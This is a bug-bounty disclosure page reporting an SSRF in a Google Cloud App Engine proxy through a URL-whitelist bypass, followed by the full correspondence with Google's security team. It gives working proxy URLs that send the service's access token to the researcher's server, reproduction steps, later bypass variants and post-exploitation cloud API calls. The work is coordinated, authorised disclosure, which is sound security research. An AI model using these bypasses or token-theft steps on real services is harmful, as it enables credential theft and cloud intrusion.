<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <base target="_blank"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> [#0008] SSRF via URL whitelist bypass in a Google Cloud owned App Engine service | feed </title> <meta name="description" content=" xdavidhu&#39;s bug bounty disclosures. "> <meta name="keywords" content=""> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <!-- Social: Twitter --> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:site" content="xdavidhu"> <meta name="twitter:title" content="SSRF via URL whitelist bypass in a Google Cloud owned App Engine service"> <meta name="twitter:description" content="xdavidhu's bug bounty disclosures."> <meta name="twitter:image:src" content="http://192.168.56.106:9885/asd/assets/img/cover.png"> <!-- Social: Open Graph --> <meta name="title" property="og:title" content="SSRF via URL whitelist bypass in a Google Cloud owned App Engine service"> <meta name="description" property="og:description" content="xdavidhu's bug bounty disclosures."> <meta name="image" property="og:image" content="http://192.168.56.106:9885/asd/assets/img/cover.png"> <meta name="author" content="David Schütz"> <!-- Canonical link tag --> <link rel="canonical" href="http://192.168.56.106:9885/asd/bugs/0008"> <link rel="alternate" type="application/rss+xml" title="feed" href="http://192.168.56.106:9885/asd/feed.xml"> <!-- rel prev and next --> <link rel="stylesheet" href="http://192.168.56.106:9885/asd/assets/css/main.css"> </head> <body> <main class="wrapper"> <header class="site-header"> <nav> <div class="container nav-container"> <h1 class="logo"><a href="http://192.168.56.106:9885/asd/" target="_self">feed<span></span></a></h1> <ul class="navbar"> <li><a href="https://bugs.xdavidhu.me/" target="_self">bugs.xdavidhu.me</a></li> </ul> </div> </nav> </header> <article class="post container" itemscope itemtype="http://schema.org/BlogPosting"> <header class="post-header"> <p class="post-meta"> <span>#0008</span><br/> <span>Vendor: Google</span><br/> <span>Status: fixed</span><br/> <span>Reported: Mar 23, 2021</span><br/> <span>Disclosed: </span><time datetime="2021-06-23T00:00:00+00:00" itemprop="datePublished">Jun 23, 2021</time> (92 days) </p> <h1 class="post-title" itemprop="name headline">SSRF via URL whitelist bypass in a Google Cloud owned App Engine service</h1> </header> <div class="post-content" itemprop="articleBody"> <p><strong>Summary:</strong></p> <p>Access Token for internal GCP project “cxl-services” (with scopes <code class="language-plaintext highlighter-rouge">"https://www.googleapis.com/auth/dispatcher</code>, <code class="language-plaintext highlighter-rouge">https://www.googleapis.com/auth/jobs</code> and <code class="language-plaintext highlighter-rouge">https://www.googleapis.com/auth/cloud-platform"</code>) can be leaked using a URL whitelist bypass on <code class="language-plaintext highlighter-rouge">https://cxl-services.appspot.com/proxy</code>. This token could be used to elevate privileges in other internal projects, access some internal Compute instances and possibly take full control over <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code>. This App Engine app proxies demo API requests on Google Cloud product pages (e.g. Cloud Text-to-Speech Demo).</p> <p><strong>Core Issue:</strong></p> <p>The domain whitelist check on <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code> can be bypassed with the <code class="language-plaintext highlighter-rouge">\@</code> trick. It is probably using the vulnerable regex from <a href="https://tools.ietf.org/html/rfc3986#appendix-B">https://tools.ietf.org/html/rfc3986#appendix-B</a>.</p> <p>When validating the URL <code class="language-plaintext highlighter-rouge">https://[your_domain]\@jobs.googleapis.com</code>, the regex thinks that the authority is <code class="language-plaintext highlighter-rouge">jobs.googleapis.com</code>, but the library making the request actually parses <code class="language-plaintext highlighter-rouge">[your_domain]</code> as the authority, and <code class="language-plaintext highlighter-rouge">/@jobs.googleapis.com</code> as the path.</p> <p><strong>Steps to Reproduce:</strong></p> <p><em>If you already have an HTTPS server where you can view request headers, skip to <code class="language-plaintext highlighter-rouge">Step 5.</code>.</em> <br /> <em>You can probably use plain HTTP and <code class="language-plaintext highlighter-rouge">netcat</code>, but then the access token would be transported unencryped.</em></p> <ol> <li>Set up a VPS, and point a domain to it</li> <li>Generate an SSL certificate with LetsEncrypt</li> <li>Download my <a href="https://gist.github.com/xdavidhu/9491a9918b4dfbaffb789a8b9f2d1672"><code class="language-plaintext highlighter-rouge">httpsserver.py</code> Python script</a>, and fill out the <code class="language-plaintext highlighter-rouge">hostname</code> variable on <code class="language-plaintext highlighter-rouge">line 5</code></li> <li>Create an empty directory, <code class="language-plaintext highlighter-rouge">cd</code> into it, and start the server with <code class="language-plaintext highlighter-rouge">sudo /path/to/httpsserver.py --verbose</code></li> <li>With a browser, open the URL <code class="language-plaintext highlighter-rouge">https://cxl-services.appspot.com/proxy?url=https://[your_domain]\@jobs.googleapis.com/</code></li> <li>On your VPS, see that the <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code> App Engine app has sent a request with the header <code class="language-plaintext highlighter-rouge">authorization: Bearer [access-token]</code></li> </ol> <p><strong>Post-Exploitation:</strong></p> <p>I’ve sent some (in my viewpoint, harmless) read-only requests with the access-token to prove impact, here is what I found:</p> <p>This access token has (some) access to these GCP projects:</p> <ul> <li><code class="language-plaintext highlighter-rouge">docai-demo</code></li> <li><code class="language-plaintext highlighter-rouge">cxl-services</code></li> <li><code class="language-plaintext highlighter-rouge">garage-staging</code></li> <li><code class="language-plaintext highlighter-rouge">p-jobs</code></li> </ul> <p>Based on some other API requests I made, it feels like the token has “full” access to <code class="language-plaintext highlighter-rouge">docai-demo</code> and <code class="language-plaintext highlighter-rouge">cxl-services</code>, and limited access on <code class="language-plaintext highlighter-rouge">garage-staging</code> and <code class="language-plaintext highlighter-rouge">p-jobs</code>.</p> <p>On the project <code class="language-plaintext highlighter-rouge">docai-demo</code> I have found 2 GCE instances:</p> <ul> <li><code class="language-plaintext highlighter-rouge">gke-cluster-1-default-pool-af71d616-j454</code> (<code class="language-plaintext highlighter-rouge">35.193.88.22</code>)</li> <li><code class="language-plaintext highlighter-rouge">gke-cluster-1-default-pool-af71d616-stj9</code> (<code class="language-plaintext highlighter-rouge">35.223.244.119</code>)</li> </ul> <p>Both of these instances have the metadata entry with key <code class="language-plaintext highlighter-rouge">kube-env</code> witch exposes (to my limited Kubernetes knowledge) all of the node’s credentials: <code class="language-plaintext highlighter-rouge">KUBELET_CERT</code>, <code class="language-plaintext highlighter-rouge">KUBELET_KEY</code> and <code class="language-plaintext highlighter-rouge">CA_CERT</code>.</p> <p>The project <code class="language-plaintext highlighter-rouge">cxl-services</code> is hosting the App Engine app <code class="language-plaintext highlighter-rouge">https://cxl-services.appspot.com/</code>, which proxies demo API requests on the Google Cloud product pages. It feels like this access token has <strong>full access to this App Engine app</strong>, but I wasn’t able to prove any impact here, since the API <code class="language-plaintext highlighter-rouge">appengine.googleapis.com</code> is not enabled on the <code class="language-plaintext highlighter-rouge">cxl-services</code> project, and I didn’t want to enable it.</p> <p>I also saw some enabled <code class="language-plaintext highlighter-rouge">staging</code> or <code class="language-plaintext highlighter-rouge">autopush</code> APIs, so some non-public APIs/versions might be available using these projects.</p> <p>Interestingly enough, I wasn’t able to hit the Metadata API using this domain bypass. Every attempt resulted in <code class="language-plaintext highlighter-rouge">500 Internal Server Error</code>. But it looks like this access token has the same privileges as the service account I could have stolen from the Metadata API.</p> <p><strong>Documentation of my actions:</strong></p> <p>During testing I might have made <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code> send HTTP / HTTPS requests (with the access token) to these domains <em>not</em> under my control:</p> <ul> <li><code class="language-plaintext highlighter-rouge">xip.io</code> (for <code class="language-plaintext highlighter-rouge">169.254.169.254.xip.io</code>)</li> <li><code class="language-plaintext highlighter-rouge">screenshot.googleplex.com</code></li> <li><code class="language-plaintext highlighter-rouge">xdavidhu.me</code> (GitHub Pages)</li> <li><code class="language-plaintext highlighter-rouge">jobs.go</code> (unexistent domain)</li> <li><code class="language-plaintext highlighter-rouge">169.254.169.253</code>,<code class="language-plaintext highlighter-rouge">169.254.169.254</code>,<code class="language-plaintext highlighter-rouge">metadata</code>,<code class="language-plaintext highlighter-rouge">metadata.google.internal</code> (for metadata testing without success)</li> <li><code class="language-plaintext highlighter-rouge">jobs.googleapis.com</code>, <code class="language-plaintext highlighter-rouge">texttospeech.googleapis.com</code></li> </ul> <p>I have called these API methods with the access tokens obtained:</p> <ul> <li><code class="language-plaintext highlighter-rouge">https://oauth2.googleapis.com/tokeninfo</code></li> <li><code class="language-plaintext highlighter-rouge">https://cloudresourcemanager.googleapis.com/v1/projects</code></li> <li><code class="language-plaintext highlighter-rouge">https://appengine.googleapis.com/v1/apps/[project]/services</code> (<code class="language-plaintext highlighter-rouge">cxl-services</code>)</li> <li><code class="language-plaintext highlighter-rouge">https://compute.googleapis.com/compute/v1/projects/[project]/aggregated/instances</code> (<code class="language-plaintext highlighter-rouge">garage-staging</code>, <code class="language-plaintext highlighter-rouge">cxl-services</code>, <code class="language-plaintext highlighter-rouge">docai-demo</code>)</li> <li><code class="language-plaintext highlighter-rouge">https://servicemanagement.googleapis.com/v1/services?consumerId=project:[project]</code> (<code class="language-plaintext highlighter-rouge">cxl-services</code>, <code class="language-plaintext highlighter-rouge">p-jobs</code>, <code class="language-plaintext highlighter-rouge">garage-staging</code>, <code class="language-plaintext highlighter-rouge">docai-demo</code>)</li> <li><code class="language-plaintext highlighter-rouge">https://cloudconsole-pa.clients6.google.com/v2/entity/APP_ENGINE_VERSIONS_LIST</code> (<code class="language-plaintext highlighter-rouge">cxl-services</code>)</li> </ul> <p><strong>Impact:</strong></p> <p>An anonymous attacker could exploit the URL validation vulnerability, and steal the access token the <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code> App Engine app is sending.</p> <p>Using this access token, the attacker could access resources on GCP projects <code class="language-plaintext highlighter-rouge">docai-demo</code>, <code class="language-plaintext highlighter-rouge">cxl-services</code>,<code class="language-plaintext highlighter-rouge">garage-staging</code> and <code class="language-plaintext highlighter-rouge">p-jobs</code>.</p> <p>Some attacks I think could be performed by an attacker:</p> <ul> <li>Take over the App Engine app <code class="language-plaintext highlighter-rouge">https://cxl-services.appspot.com/</code>, and steal the contents of all demo API requests and/or return malicious content to the users trying out the demos on the Cloud product pages.</li> <li>Take over the GKE cluster used by <code class="language-plaintext highlighter-rouge">docai-demo</code>, (which is probably running the demo on <code class="language-plaintext highlighter-rouge">https://cloud.google.com/document-ai</code>) and steal the contents of all demo API requests and/or return malicious content. This falls under the first attack’s impact, since this demo is also proxied by <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code>.</li> <li>Try escalate privileges and maybe gain access to more internal Google Cloud resources.</li> </ul> <hr /> <h3 id="comments">Comments:</h3> <p><strong>Vendor - 2021-03-23 12:10</strong></p> <p><em>NOTE: This e-mail has been generated automatically.</em></p> <p>Thanks for your report.</p> <p>This email confirms we’ve received your message. We’ll investigate and get back to you once we’ve got an update. In the meantime, you might want to take a look at the <a href="https://sites.google.com/site/bughunteruniversity/behind-the-scenes/faq">list of frequently asked questions about Google VRP</a>.</p> <p>If you are reporting a security vulnerability and wish to appear in Google Security Hall of Fame, please <a href="https://bughunter.withgoogle.com/new_profile">create a profile</a>.</p> <p>You appear automatically in our Honorable Mentions if we decide to file a security vulnerability based on your report, and you will also show up in our Hall of Fame if we issue a reward.</p> <p><strong>Note that if you did not report a vulnerability, or a technical security problem in one of our products, we won’t be able to act on your report. This channel is not the right one if you wish to resolve a problem with your account, report non-security bugs, or suggest a new feature in our product.</strong></p> <p>Cheers, <br /> Google Security Bot</p> <p><a href="https://twitter.com/googlevrp">Follow us</a> on Twitter!</p> <hr /> <p><strong>Vendor - 2021-03-23 18:58</strong></p> <p><em>NOTE: This e-mail has been generated automatically.</em></p> <p>Hey,</p> <p>Just letting you know that your report was <strong>triaged</strong> and we’re currently looking into it.</p> <p>You should receive a response in a couple of days, but it might take up to a week if we’re particularly busy. In the meantime, you might want to take a look at <a href="https://sites.google.com/site/bughunteruniversity/behind-the-scenes/faq">the list of frequently asked questions about Google VRP</a>.</p> <p>Thanks, <br /> Google Security Bot</p> <hr /> <p><strong>Me - 2021-03-28 21:29</strong></p> <p>Hi,</p> <p><strong>I was able to demonstrate full access to the <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code> GAE app</strong> by deploying a <code class="language-plaintext highlighter-rouge">vrp-poc</code> service: <a href="https://vrp-poc-dot-cxl-services.appspot.com/">https://vrp-poc-dot-cxl-services.appspot.com/</a></p> <p>I found some other sensitive things on project <code class="language-plaintext highlighter-rouge">cxl-services</code>:</p> <ul> <li>The bucket <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code> <strong>has hourly <code class="language-plaintext highlighter-rouge">appengine.googleapis.com/request_log</code> files</strong> since <code class="language-plaintext highlighter-rouge">2017-10-18</code> up until today. These might contain sensitive user data.</li> <li>The bucket <code class="language-plaintext highlighter-rouge">staging.cxl-services.appspot.com</code> <em>(was, now I uploaded the 3 POC files)</em> empty, so the source files were not available. (The <code class="language-plaintext highlighter-rouge">get-version</code> AppEngine API call listed all filenames, like <code class="language-plaintext highlighter-rouge">google3/cloud/ux/services/services/proxy.py</code>) <strong>But</strong>, the <code class="language-plaintext highlighter-rouge">us.artifacts.cxl-services.appspot.com</code> bucket had some images, from which <strong>the source code could be extracted</strong>.</li> </ul> <p>The requests I have made with the obtained access tokens:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://servicemanagement.googleapis.com/v1/services/appengine.googleapis.com
- https://servicemanagement.googleapis.com/v1/services/issuetracker.corp.googleapis.com
- https://serviceusage.googleapis.com/v1beta1/projects/cxl-services/services/appengine.googleapis.com:enable
- https://cloudconsole-pa.clients6.google.com/graphql/SERVICE_USAGE_GRAPHQL
- https://servicemanagement.googleapis.com/v1/services/appengine.googleapis.com:enable?consumer_id=project%3Acxl-services (success)
- https://appengine.googleapis.com/v1/apps/cxl-services.appspot.com/services
- https://appengine.googleapis.com/v1/apps/cxl-services/services
- https://appengine.googleapis.com/v1/apps/cxl-services/services/default/versions
- https://servicemanagement.googleapis.com/v1/services/issuetracker.corp.googleapis.com:enable?consumer_id=project%3Acxl-services (fail)
- https://appengine.googleapis.com/v1/apps/cxl-services/services/default/versions/b347699687-dev-gokulr
- https://appengine.googleapis.com/v1/apps/cxl-services/services/default/versions/b347699687-dev-gokulr?view=FULL
- https://storage.googleapis.com/staging.cxl-services.appspot.com/ae-fingerprinted/5d8be43828d2c7161e68484222b6212529235137 (404)
- https://storage.googleapis.com/staging.cxl-services.appspot.com/ae-fingerprinted/ (404)
- https://storage.googleapis.com/staging.cxl-services.appspot.com/ (empty)
- https://storage.googleapis.com/storage/v1/b?alt=json&amp;fields=items%2Fid%2CnextPageToken&amp;maxResults=1000&amp;project=cxl-services&amp;projection=noAcl
- https://storage.googleapis.com/cxl-services.appspot.com/ (request log!)
- https://storage.googleapis.com/artifacts.cxl-services.appspot.com/ (empty)
- https://storage.googleapis.com/us.artifacts.cxl-services.appspot.com/ (images!)
- https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o?alt=json&amp;fields=items%2Fid%2CnextPageToken&amp;maxResults=1000&amp;project=cxl-services&amp;projection=noAcl
- https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o?alt=json&amp;maxResults=1000&amp;project=cxl-services&amp;projection=noAcl (log sizez!)

- https://storage.googleapis.com/upload/storage/v1/b/staging.cxl-services.appspot.com/o?alt=json&amp;name=e8439a6b8f01e74d2dfc52eba0604d8c6885c834&amp;uploadType=multipart
- https://storage.googleapis.com/upload/storage/v1/b/staging.cxl-services.appspot.com/o?alt=json&amp;name=28e492b17a63d596557c1c73ef4ac3e18447a21e&amp;uploadType=multipart
- https://storage.googleapis.com/upload/storage/v1/b/staging.cxl-services.appspot.com/o?alt=json&amp;name=125e0b77828c18da7d6e2e698800b63996579658&amp;uploadType=multipart
- https://storage.googleapis.com/staging.cxl-services.appspot.com/
- https://storage.googleapis.com/staging.cxl-services.appspot.com/
- https://appengine.googleapis.com/v1/apps/cxl-services/services/vrp-poc/versions?alt=json

- https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o
- https://storage.googleapis.com/storage/v1/b/cxl-services.appspot.com/o?prefix=appengine.googleapis.com/request_log/2021
</code></pre></div></div> <hr /> <p><strong>Vendor - 2021-03-29 08:53</strong></p> <p>Hi,</p> <p>🎉 <strong>Nice catch!</strong> I’ve filed a bug based on your report.</p> <p>The panel will evaluate it at the next VRP panel meeting and we’ll update you once we’ve got more information. All you need to do now is wait. If you don’t hear back from us in 2-3 weeks or have additional information about the vulnerability, let us know!</p> <p>Regards, <br /> [redacted], Google Security Team</p> <hr /> <p><strong>Vendor - 2021-03-29 09:03</strong></p> <p>Hi David,</p> <p>Thanks for the report, nice! great that you are not downloading files with potential PII, could you please confirm that you didn’t download them? If it was by mistake during testing please let us know which files, thanks!</p> <p>Regards, [redacted], Google Security Team</p> <hr /> <p><strong>Me - 2021-03-29 09:12</strong></p> <p>Hi,</p> <p>I only sent the requests documented above.</p> <p>The files which could contain user-information I think (from my testing) are only the logs in <code class="language-plaintext highlighter-rouge">cxl-services.appspot.com</code>. I didn’t download any of those objects, I just listed the contents of the bucket. (multiple times, even with a prefix to see if there are logs from 2021.)</p> <p>Thank you, David</p> <hr /> <p><strong>Me - 2021-03-29 09:22</strong></p> <p>Hi,</p> <p>There are still 3 projects for this access token that I didn’t really look into: <code class="language-plaintext highlighter-rouge">docai-demo</code> <code class="language-plaintext highlighter-rouge">garage-staging</code> <code class="language-plaintext highlighter-rouge">p-jobs</code></p> <p>Can I play with these, or should I stop testing for now?</p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Vendor - 2021-03-29 10:01</strong></p> <p>Hi David,</p> <p>Thanks for the info and quick followup.</p> <p>Please don’t continue - the info we have is enough to fix and determine the reward, thanks!</p> <p>[redacted]</p> <hr /> <p><strong>Vendor - 2021-04-13 18:20</strong></p> <p>** NOTE: This is an automatically generated email **</p> <p>Hello,</p> <p>Thank you for reporting this bug. As part of Google’s Vulnerability Reward Program, the panel has decided to issue a reward of $4133.70.</p> <p>Rationale for this decision: 1k bonus for the well written report and documenting lateral movement. Thanks! :)</p> <p>Important: if you aren’t registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to do it again - sit back and relax, and we will process the payment soon.</p> <p>If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from. Regards,</p> <p>Google Security Bot</p> <p>If you’d like your name added to our Hall of Fame:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://bughunter.withgoogle.com/
</code></pre></div></div> <p>Just create a profile here: https://bughunter.withgoogle.com/new_profile</p> <p>In addition, we encourage you to signup for our Vulnerability Research Grants program, where we issue monetary payments to VRP researchers, even when no vulnerabilities are found. To read more about the program visit: https://www.google.com/about/appsecurity/research-grants/</p> <p>– How did we do? Please fill out a short anonymous survey (https://goo.gl/IR3KRH).</p> <hr /> <p><strong>Me - 2021-06-01 12:08</strong></p> <p>Hi,</p> <p>Just a heads-up, this issue will be disclosed in 20 days, on <code class="language-plaintext highlighter-rouge">2021-06-21</code>.</p> <p>I might make a video about this using screen recordings of finding the bug. These recordings include some internal information. Should I redact any particular details?</p> <p>Also, my POC is still up and running: <a href="https://vrp-poc-dot-cxl-services.appspot.com/">https://vrp-poc-dot-cxl-services.appspot.com/</a></p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Vendor - 2021-06-01 12:24</strong></p> <p>Hi,</p> <p>Thanks for the heads up about the disclosure of your report.</p> <p>Please read <a href="https://security.googleblog.com/2010/07/rebooting-responsible-disclosure-focus.html">our stance on coordinated disclosure</a>. In essence, <strong>our pledge to you is to respond promptly and fix vulnerabilities in a sensible timeframe</strong> - and in exchange, <strong>we ask for a reasonable advance notice</strong>.</p> <p>Some things to note:</p> <ol> <li>We might decide not to file a bug, or not to issue a VRP reward. Even if this is the case, please still coordinate your disclosure with us. Many of the reports we receive don’t describe vulnerabilities with an impact that qualifies for a reward, but we still want to make sure we are prepared for your vulnerability disclosure.</li> <li>We usually decide and pay the rewards before the vulnerability is fixed. The reward is not a payment for your silence, but we really want to have a chance to fix it on time for your disclosure, so please keep us up to date with the disclosure timeline, so we can update the engineering team of your plans.</li> <li>If you gave us enough time to fix the described issue (you can read https://www.google.com/about/appsecurity/ for inspiration), and we are anyway unable to fix it before your disclosure date, we’ll try to let you know in time (the disclosure date would still be your own decision).</li> </ol> <p>At the end, <strong>the decision on what to disclose and when is yours</strong>, and we would be happy to forward any blog posts, slides, or paper drafts you might have to our teams internally (we might even provide you feedback). Thanks again for your help.</p> <p>PS. If you give a talk, or make a blog post, or similar about this bug, please send us a link, we would love to read it, we might even tweet it from <a href="https://twitter.com/GoogleVRP">our Twitter account</a>.</p> <hr /> <p><strong>Me - 2021-06-16 12:10</strong></p> <p>Hi,</p> <p>So before starting to work on the writeup, I wanted to test the fix. It indeed fixed the original trick of using <code class="language-plaintext highlighter-rouge">https://[your_domain]\@jobs.googleapis.com</code>.</p> <p>But playing around a bit, I have found a way to once again bypass the URL whitelist: <br /> <code class="language-plaintext highlighter-rouge">https://cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\_@jobs.googleapis.com/</code></p> <p>Opening this URL sends a request to my server with an access token.</p> <p>Actually, it is not specific to the <code class="language-plaintext highlighter-rouge">_</code> character. Putting anything between the <code class="language-plaintext highlighter-rouge">\</code> and the <code class="language-plaintext highlighter-rouge">@</code> bypasses the whitelist, for example: <br /> <code class="language-plaintext highlighter-rouge">https://cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\anything@jobs.googleapis.com/</code></p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Me - 2021-06-17 09:36</strong></p> <p>Hi,</p> <p>Will a fix roll out until <code class="language-plaintext highlighter-rouge">2021-06-21</code>? <br /> If a fix will be deployed, but not until the deadline, I can delay the disclosure 14 days, with a new date of <code class="language-plaintext highlighter-rouge">2021-07-05</code>.</p> <p>Let me know if I should delay the disclosure, of if a fix is coming.</p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Vendor - 2021-06-18 11:38</strong></p> <p>Heya David,</p> <p>So this one has been marked fixed by the product team, but its pending verification that the fix is accurate on our side. Ostensibly the fix is live now. (just unverified/checked by us)</p> <p>You’ll get a notification when we’ve done the verification, but in the above context, I think the answer is the fix is deployed :D</p> <p>cheers</p> <hr /> <p><strong>Me - 2021-06-18 12:13</strong></p> <p>Hi,</p> <p>I meant the fix for the bypass I found in comment #13. Did the product team fix that as well?</p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Vendor - 2021-06-22 18:07</strong></p> <p>Hey,</p> <p>Looks like the team did not know about that bypass. I reopened the bug and the team says it should be fixed now. Thanks!</p> <hr /> <p><strong>Me - 2021-06-23 18:32</strong></p> <p>Hi,</p> <p>I can confirm that the bypass is also fixed now. My GAE POC is still running, but I’m fine with that :)</p> <p>This report with all additional comments (with names redacted) has been published. You can find it here: <br /> https://feed.bugs.xdavidhu.me/bugs/0008</p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Vendor - 2021-06-24 18:20</strong></p> <p>** NOTE: This is an automatically generated email **</p> <p>Hello,</p> <p>Regarding our Vulnerability Reward Program: The VRP panel has decided to issue a reward of $3133.70 for your report. Congratulations!</p> <p>Rationale for this decision: Thanks for reporting the bypass!</p> <p>Important: If you aren’t already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.</p> <p>Note: This month, we are changing our payment processing backend. There might be small delays (a few weeks) with how the payments are processed. Thanks for understanding, and sorry for the trouble!</p> <p>If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.</p> <p>Regards,</p> <p>Google Security Bot</p> <p>P.S. Two other things we’d like to mention:</p> <ul> <li>If you’d like us to add your name to our Hall of Fame at https://bughunter.withgoogle.com/rank/hof, please create a profile at https://bughunter.withgoogle.com/new_profile if you haven’t already done so.</li> <li>We encourage you to sign up for our Vulnerability Research Grants program at https://www.google.com/about/appsecurity/research-grants/, where we issue monetary payments to VRP researchers, even when no vulnerabilities are found.</li> </ul> <p>– How did we do? Please fill out a short anonymous survey (https://goo.gl/IR3KRH).</p> <hr /> <p><strong>Me - 2021-08-28 13:12</strong></p> <p>Hi,</p> <p>So I bypassed it again. The old vulnerable versions are still there on the AppEngine app, and even though the latest version is fixed, you can still call the old versions of the <code class="language-plaintext highlighter-rouge">default</code> service.</p> <p>POC:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://b347699687-dev-gokulr-dot-default-dot-cxl-services.appspot.com/proxy?url=https://sfmnev.vps.xdavidhu.me\@jobs.googleapis.com/
</code></pre></div></div> <p><em>(This time I have sent two requests to my VM and one to GitHub Pages (<code class="language-plaintext highlighter-rouge">https://xdavidhu.me/</code>). The GAE app’s access token is in the <code class="language-plaintext highlighter-rouge">authorization</code> header.)</em></p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Me - 2021-08-28 13:13</strong></p> <p>Also, my POC service is still up and running: https://vrp-poc-dot-cxl-services.appspot.com/</p> <hr /> <p><strong>Vendor - 2021-09-01 11:49</strong></p> <p>Hi,</p> <p>🙏 Thanks again for your report! I’ve updated the internal bug we already had about this issue. We’ll work with the product team to ensure this issue is addressed. We’ll let you know when the issue was fixed.</p> <p>Regarding our Vulnerability Reward Program: The VRP panel will evaluate your report at the next meeting. We’ll update you once we’ve come to a decision. If you don’t hear back from us in 2-3 weeks, or if you have additional information about the vulnerability, let us know!</p> <p>Regards, <br /> [redacted], Google Security Team</p> <hr /> <p><strong>Vendor - 2021-09-02 19:00</strong></p> <p>** NOTE: This is an automatically generated email **</p> <p>Hello,</p> <p>Regarding our Vulnerability Reward Program: The VRP panel has decided to issue a reward of $3133.70 for your report. Congratulations!</p> <p>Rationale for this decision: Thanks for letting us know about the bypass!</p> <p>Important: If you aren’t already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.</p> <p>If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.</p> <p>Regards,</p> <p>Google Security Bot</p> <p>P.S. Two other things we’d like to mention:</p> <ul> <li>If you’d like us to add your name to our Leaderboard at https://bughunters.google.com/leaderboard, please create a profile at https://bughunters.google.com if you haven’t already done so.</li> <li>We encourage you to sign up for our Vulnerability Research Grants program at https://www.google.com/about/appsecurity/research-grants/, where we issue monetary payments to VRP researchers, even when no vulnerabilities are found.</li> </ul> <p>– How did we do? Please fill out a short anonymous survey (https://goo.gl/IR3KRH).</p> <hr /> <p><strong>Me - 2021-11-12 18:38</strong></p> <p>Hi,</p> <p>The latest bypass looks fixed as well. I am creating a YouTube video about this bug. I plan to release in the next couple of days.</p> <p>The video includes screen recordings of me finding the vulnerability, and exploiting it. It includes some internal details that I accessed during the research of this bug. My actions during the research are documented above.</p> <p>If you’d like me to redact some details, please let me know.</p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Vendor - 2021-11-15 14:32</strong></p> <p>Hi David,</p> <p>Thanks again for a great report!</p> <p>What are the internal details - GCP project names? The logs are just content of the bucket (file names)?</p> <p>Regards, [redacted], Google Security Team</p> <hr /> <p><strong>Me - 2021-11-15 14:43</strong></p> <p>Hi [redacted],</p> <p>It’s everything I saw during the finding of this issue. <br /> This is the yet-unreleased video: https://youtu.be/UyemBjyQ4qA</p> <p>I redacted a private key I saw when listing the VMs inside the <code class="language-plaintext highlighter-rouge">docai-demo</code> project, and I also redacted your names in the issuetracker responses. <br /> Otherwise, I think most of the information is already disclosed at https://feed.bugs.xdavidhu.me/bugs/0008</p> <p>Please let me know if this is good to go.</p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Me - 2021-11-16 16:10</strong></p> <p>Hi,</p> <p>What is the ETA of this approval?</p> <p>Thank you, <br /> David</p> <hr /> <p><strong>Vendor - 2021-11-17 15:52</strong></p> <p>Hi David,</p> <p>Thanks for your patience. We really appreciate that you sent the video to us as we don’t require that - please use your best judgement similar to when you publish your write-ups. If there is not more info than in the write-up then it’s fine.</p> <p>It was funny to see you when you realized what you found;)</p> <p>Good luck with your bughunting videos!</p> <p>Regards, [redacted], Google Security Team</p> </div> </article> </main> </body> </html>
